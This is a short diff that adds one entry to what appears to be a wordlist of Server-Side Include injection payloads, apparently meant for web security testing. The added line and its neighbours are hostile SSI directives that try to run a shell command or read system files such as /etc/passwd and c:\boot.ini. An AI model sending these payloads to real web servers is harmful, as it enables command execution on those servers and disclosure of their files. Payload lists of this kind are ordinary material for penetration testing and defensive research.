@@ -101,6 +101,7 @@
 <!--#exec cmd="{cmd}"-->
 <!--#flastmod virtual="echo.html" -->
 <!--#fsize file="ssi.shtml" -->
+<!--#include file=""c:\boot.ini""-->"
 <!--#include file=?uuuuuuuu...uu?-->
 <!--#include virtual="/" -->
 <!--#include virtual="/etc/passwd" -->
